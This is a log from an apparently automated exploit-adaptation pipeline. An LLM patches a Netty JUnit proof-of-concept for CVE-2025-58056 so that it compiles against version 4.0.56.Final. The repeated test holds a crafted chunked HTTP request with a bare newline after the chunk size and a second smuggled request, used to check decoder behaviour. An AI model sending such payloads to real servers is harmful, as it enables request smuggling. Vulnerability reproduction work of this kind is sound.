[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1971 (prompt), 1 (completion), 1972 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.1.0.Beta1.

Your task is to:
1. Analyze why this issue occurs with the *4.1.0.Beta1* but not with the *4.0.56.Final version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol
  symbol:   method decoderResult()
  location: variable request of type io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
  symbol:   method decoderResult()
  location: variable content of type io.netty.handler.codec.http.HttpContent
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.882 s
[INFO] Finished at: 2025-09-25T05:58:17Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol
[ERROR]   symbol:   method decoderResult()
[ERROR]   location: variable request of type io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
[ERROR]   symbol:   method decoderResult()
[ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.56.Final</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'cannot find symbol | method decoderResult()': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 41, 'column': 28, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable request of type io.netty.handler.codec.http.HttpRequest', 'code_line': '        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.'}, {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 45, 'column': 46, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable content of type io.netty.handler.codec.http.HttpContent', 'code_line': '        DecoderResult decoderResult = content.decoderResult();'}]}
[LLMClient] Tokens used: 158 (prompt), 5 (completion), 163 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.56.Final: 

Error: cannot find symbol, method decoderResult(), variable request of type io.netty.handler.codec.http.HttpRequest 

The test executes as expected in 4.1.0.Beta1 

Error code:         assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine. 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
request;decoderResult
[96m[ErrorManager] Extracted key entities: ['request', 'decoderResult'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 41, 'column': 28, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable request of type io.netty.handler.codec.http.HttpRequest', 'code_line': '        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.'} with cause: ['request', 'decoderResult'][0m
[96m[Adapter] Related diffs for error: [(1333, 10.0), (1363, 10.0), (1406, 10.0), (1797, 10.0), (202, 6.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method decoderResult() cause: ['request', 'decoderResult'][0m
[96m[RepairModule] Trying best diff #1333 with score 10.00[0m
[LLMClient] Tokens used: 994 (prompt), 455 (completion), 1449 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.1.0.Beta1.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.1.0.Beta1 to 4.0.56.Final.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method decoderResult(), location: variable request of type io.netty.handler.codec.http.HttpRequest

### Error Position:
        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.

### Related Diff:
Operation: MODIFIED, File: example/src/main/java/io/netty/example/http/file/HttpStaticFileServerHandler.java, Hunk: @@ -107,26 +109,19 @@ public class HttpStaticFileServerHandler extends SimpleChannelInboundHandler<Ful
     public static final String HTTP_DATE_GMT_TIMEZONE = "GMT";
     public static final int HTTP_CACHE_SECONDS = 60;

+    private final boolean useSendFile;
+
+    public HttpStaticFileServerHandler(boolean useSendFile) {
+        this.useSendFile = useSendFile;
+    }
+
     @Override
+    public void channelRead0(
+            ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {
+        if (!request.getDecoderResult().isSuccess()) {
-    public void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {
-        if (!request.decoderResult().isSuccess()) {
             sendError(ctx, BAD_REQUEST);
             return;
         }

+        if (request.getMethod() != GET) {
-        if (request.method() != GET) {
             sendError(ctx, METHOD_NOT_ALLOWED);
             return;
         }

+        final String uri = request.getUri();
-        final String uri = request.uri();
         final String path = sanitizeUri(uri);
         if (path == null) {
             sendError(ctx, FORBIDDEN);

### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.decoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
```java
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.decoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 11 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | method decoderResult()'}
[RepairModule] New grouped keys: {'cannot find symbol | method decoderResult()'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 11 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1800 (prompt), 1 (completion), 1801 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.1.0.Beta1.

Your task is to:
1. Analyze why this issue occurs with the *4.1.0.Beta1* but not with the *4.0.56.Final version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
  symbol:   method decoderResult()
  location: variable content of type io.netty.handler.codec.http.HttpContent
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.882 s
[INFO] Finished at: 2025-09-25T05:58:49Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
[ERROR]   symbol:   method decoderResult()
[ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.56.Final</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'cannot find symbol | method decoderResult()': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 45, 'column': 46, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable content of type io.netty.handler.codec.http.HttpContent', 'code_line': '        DecoderResult decoderResult = content.decoderResult();'}]}
[LLMClient] Tokens used: 151 (prompt), 6 (completion), 157 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.56.Final: 

Error: cannot find symbol, method decoderResult(), variable content of type io.netty.handler.codec.http.HttpContent 

The test executes as expected in 4.1.0.Beta1 

Error code:         DecoderResult decoderResult = content.decoderResult(); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
decoderResult;HttpContent
[96m[ErrorManager] Extracted key entities: ['decoderResult', 'HttpContent'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 45, 'column': 46, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable content of type io.netty.handler.codec.http.HttpContent', 'code_line': '        DecoderResult decoderResult = content.decoderResult();'} with cause: ['decoderResult', 'HttpContent'][0m
[96m[Adapter] Related diffs for error: [(703, 10.0), (202, 6.0), (238, 6.0), (329, 6.0), (231, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method decoderResult() cause: ['decoderResult', 'HttpContent'][0m
[96m[RepairModule] Trying best diff #703 with score 10.00[0m
[LLMClient] Tokens used: 928 (prompt), 451 (completion), 1379 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.1.0.Beta1.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.1.0.Beta1 to 4.0.56.Final.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method decoderResult(), location: variable content of type io.netty.handler.codec.http.HttpContent

### Error Position:
        DecoderResult decoderResult = content.decoderResult();

### Related Diff:
Operation: MODIFIED, File: codec-http/src/test/java/io/netty/handler/codec/http/HttpInvalidMessageTest.java, Hunk: @@ -91,11 +91,11 @@ public void testBadChunk() throws Exception {
         ch.writeInbound(Unpooled.copiedBuffer("Transfer-Encoding: chunked\r\n\r\n", CharsetUtil.UTF_8));
         ch.writeInbound(Unpooled.copiedBuffer("BAD_LENGTH\r\n", CharsetUtil.UTF_8));

+        HttpRequest req = (HttpRequest) ch.readInbound();
+        assertTrue(req.getDecoderResult().isSuccess());
-        HttpRequest req = ch.readInbound();
-        assertTrue(req.decoderResult().isSuccess());

+        HttpContent chunk = (HttpContent) ch.readInbound();
+        DecoderResult dr = chunk.getDecoderResult();
-        LastHttpContent chunk = ch.readInbound();
-        DecoderResult dr = chunk.decoderResult();
         assertFalse(dr.isSuccess());
         assertTrue(dr.isFailure());
         ensureInboundTrafficDiscarded(ch);

### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.decoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
